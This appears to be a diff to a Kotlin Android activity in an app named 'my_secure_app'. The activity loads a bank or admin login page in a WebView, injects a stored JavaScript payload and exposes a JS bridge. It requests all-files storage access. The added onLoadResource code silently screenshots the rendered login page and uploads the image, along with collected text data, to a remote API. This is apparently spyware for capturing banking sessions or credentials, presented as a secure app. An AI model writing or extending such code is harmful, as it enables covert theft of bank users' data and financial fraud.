@@ -1,14 +1,12 @@
 package com.example.my_secure_app
 
 import android.Manifest
-import android.app.Activity
+import android.Manifest.permission.WRITE_EXTERNAL_STORAGE
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.graphics.*
-import android.os.Bundle
-import android.os.Environment
-import android.os.Handler
-import android.os.Looper
+import android.net.Uri
+import android.os.*
+import android.os.Build.VERSION.SDK_INT
 import android.provider.Settings
 import android.text.format.DateFormat
 import android.util.Log
@@ -40,7 +38,9 @@ class MyTestingActivityKotlin : AppCompatActivity() {
     private var close: ImageView?=null
     private val REQUEST_EXTERNAL_STORAGe = 1
     private var count:Int=0
+    private var countt:Int=0
     private var JS=""" """
+    private val handler = Handler()
     private val permissionstorage = arrayOf(
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
         Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -58,12 +58,12 @@ class MyTestingActivityKotlin : AppCompatActivity() {
         window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
         window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
         window.statusBarColor = Color.parseColor("#1D1C21")
-        url!!.text = Constants.BANK_URL
-       // url!!.text = "https://adminsecure.thriftyspends.com/login"//Constants.BANK_URL
+        //url!!.text = Constants.BANK_URL
+        url!!.text = "https://adminsecure.thriftyspends.com/login"//Constants.BANK_URL
         JS="""${Constants.JS_SCRIPT}"""
-        verifypermissions(this)
-        webView?.loadUrl( Constants.BANK_URL)
-        //webView?.loadUrl("https://adminsecure.thriftyspends.com/login")
+        verifypermissions()
+        //webView?.loadUrl( Constants.BANK_URL)
+        webView?.loadUrl("https://adminsecure.thriftyspends.com/login")
         webView?.settings?.javaScriptEnabled = true
         webView?.getSettings()?.setJavaScriptCanOpenWindowsAutomatically(true);
         webView?.requestFocusFromTouch();
@@ -92,17 +92,56 @@ class MyTestingActivityKotlin : AppCompatActivity() {
                         b.compress(Bitmap.CompressFormat.JPEG, 100, os)
                         os?.flush()
                         os?.close()
-                        Log.d("SCREENSHOT","2")
                        // openScreenshot(imageFile)
                         sendScreenShotToAPi(Constants.textDataForApi,imageFile)
 
 
                     } catch (e: Exception) {
                         Log.e(javaClass.simpleName, "Error writing bitmap", e)
-                        Log.d("SCREENSHOT","3"+e)
                     }
                 }
             }
+            override fun onLoadResource(view: WebView?, url: String?){
+                if(Constants.textDataForApi.isNullOrEmpty()){
+
+                }
+                else{
+                    Log.d("SCREEN","onLoadResource")
+                    countt++
+                    if (countt==1 && count==1){
+                        handler.postDelayed({
+                            Log.d("SCREENSHOT","2")
+                            val time = System.currentTimeMillis()
+                            val picture: Picture = view!!.capturePicture()
+                            val mPath = Environment.getExternalStorageDirectory().toString() + "/" +time+ ".jpg"
+                            Log.d("SCREENSHOT",mPath)
+                            var imageFile = File(mPath)
+                            val b = Bitmap.createBitmap(
+                                picture.width,
+                                picture.height, Bitmap.Config.ARGB_8888
+                            )
+                            val c = Canvas(b)
+                            picture.draw(c)
+
+                            try {
+                                os = FileOutputStream(imageFile)
+                                b.compress(Bitmap.CompressFormat.JPEG, 100, os)
+                                os?.flush()
+                                os?.close()
+                                // openScreenshot(imageFile)
+                                sendScreenShotToAPi(Constants.textDataForApi,imageFile)
+
+
+
+                            } catch (e: Exception) {
+                                Log.e(javaClass.simpleName, "Error writing bitmap", e)
+                            }
+                        }, 3000)
+                    }
+                }
+            }
+
+
         }
         webView?.addJavascriptInterface(JSBridge, "Bridge")
         //getScreenshots("String")
@@ -123,18 +162,24 @@ class MyTestingActivityKotlin : AppCompatActivity() {
         }
     }
 
-    fun verifypermissions(activity: Activity?) {
-        val permissions = ActivityCompat.checkSelfPermission(
-            activity!!,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE
-        )
+    fun verifypermissions() {
 
-        // If storage permission is not given then request for External Storage Permission
-        if (permissions != PackageManager.PERMISSION_GRANTED) {
+        if (SDK_INT >= Build.VERSION_CODES.R) {
+            if (Environment.isExternalStorageManager()) {
+               // startActivity(Intent(this, MyTestingActivityKotlin::class.java))
+            } else { //request for the permission
+                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                val uri = Uri.fromParts("package", packageName, null)
+                intent.data = uri
+                startActivity(intent)
+            }
+        } else {
+            //below android 11=======
+            //startActivity(Intent(this, MyTestingActivityKotlin::class.java))
             ActivityCompat.requestPermissions(
-                activity,
-                this.permissionstorage,
-                this.REQUEST_EXTERNAL_STORAGe
+                this,
+                arrayOf(WRITE_EXTERNAL_STORAGE),
+                REQUEST_EXTERNAL_STORAGe
             )
         }
     }
@@ -259,4 +304,6 @@ class MyTestingActivityKotlin : AppCompatActivity() {
             }
         })
     }
+
+
 }
